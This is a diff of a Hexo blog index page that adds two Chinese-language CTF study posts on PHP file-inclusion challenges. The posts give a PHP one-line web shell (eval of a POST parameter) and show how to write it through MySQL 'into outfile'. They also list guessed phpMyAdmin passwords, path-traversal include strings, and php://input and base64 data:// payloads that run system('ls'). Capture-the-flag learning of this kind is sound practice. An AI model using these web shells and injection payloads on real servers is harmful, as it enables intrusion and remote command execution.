@@ -146,6 +146,126 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">黑盾杯学习3（文件包含问题）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-11-03 21:40:38 / Modified: 21:41:40" itemprop="dateCreated datePublished" datetime="2021-11-03T21:40:38+08:00">2021-11-03</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>三，用data伪协议去写一句话木马<br> <?php eval($_POST[v])?>.<br>开启菜刀输入木马地址（url地址）<br>—————————————————–方法分割线——————————————————-<br>四<br>用dirsurch 御剑扫（C:\工具\tools.zip\合天tool\网站信息收集\网站源码泄露）<br>Phpadmin mysql图形化管理工具<br>找到数据库中phpadmin 可以打开数据库或者写入马<br>打开数据库后可以进行猜测root root 空密码 123456 暴力破解</p>
+<p>内置数据库<br>3.数据库写马<br>select””into outfile “”;    select后可写一句话木马，outflie是路径<br>常用路径<br>linux –&gt;/tmp  路径可为/tmp/shell.php 一句话木马为 <?php eval($_POST[v])?><br>前提 secure_file_priv为空允许写入写出文件<br>为null则不可以，只能在该路径<br>打开phpadmin sql写入show variables like ‘secure_file_priv’<br>若可以则在此处写一句话木马select”<?php eval($_POST[v])?>“into outfile “/tmp/shell.php”<br>Linux中url一般在/var/www 进行文件包含打开菜刀 输入page参数<br>即为网址＋？page=../../tmp/shell.php 密码是v</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">黑盾杯学习2（文件包含问题）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-10-27 13:08:13 / Modified: 13:09:47" itemprop="dateCreated datePublished" datetime="2021-10-27T13:08:13+08:00">2021-10-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>ps:原题为攻防世界web进阶第四题<br>Web php include文件包含问题<br>查看源码，进行分析<br>发现hello变量和page变量<br>Page过滤了php://<br>在网址后加上？与变量=传输内容<br>文件包含<br>Php伪协议php://input 把想构造的东西通过post传入<br>Php://fitter/ 写入，写出文件<br>data://text/plain 与1类似<br>！应对过滤方法<br>1.大小写改动<br>2.更换输入方式，例如php改成data<br>F12打开hackbar<br>√postdata<br>然后开始尝试ls执行系统命令php   <?php system('ls')?><br>2.在后面加入&amp;page=PHP://input后尝试抓包 并写上<?php system('ls')?><br>若ls成功，则为linux环境输入cat 文件名<br>—————————————————–方法分割线——————————————————-<br>方法二，采用data://text/plain</p>
+<p>格式为page=data://text/plain；base64，将<?php system('ls')?>编码即为PD9waHAgc3lzdGVtKCdscycpPz4=<br>接着打开hackbar 下面一样输入 <?php system('ls')?><br>最后将cat 文件名也改成base64形式将url中base64后的改成cat 文件名的base64形式<br>若无反应再查看源代码即可<br>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpPz4=</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/10/21/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A01%EF%BC%88%E7%99%BB%E5%BD%95%E6%A1%86%E9%97%AE%E9%A2%98%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -641,7 +761,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
